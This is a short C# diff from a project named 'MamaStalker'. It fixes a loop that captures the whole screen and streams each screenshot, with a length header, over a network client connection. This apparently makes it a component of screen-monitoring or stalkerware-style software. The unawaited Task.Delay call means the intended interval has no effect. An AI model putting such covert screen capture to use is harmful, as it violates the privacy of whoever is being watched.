@@ -26,8 +26,10 @@ namespace MamaStalker
                 Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                 Graphics graphics = Graphics.FromImage(printscreen as Image);
                 graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);
-                byte[] bytes = MyParser.ObjectToByteArray(graphics);
-                byte[] lengthHeader = MyParser.ObjectToByteArray(bytes.Length);
+                byte[] bytes = MyParser.ObjectToByteArray(printscreen);
+                int len = bytes.Length;
+                byte[] lengthHeader = MyParser.ObjectToByteArray(len);
+                MyClientConnection.Send(lengthHeader);
                 MyClientConnection.Send(bytes);
                 Task.Delay(Interval);
             }
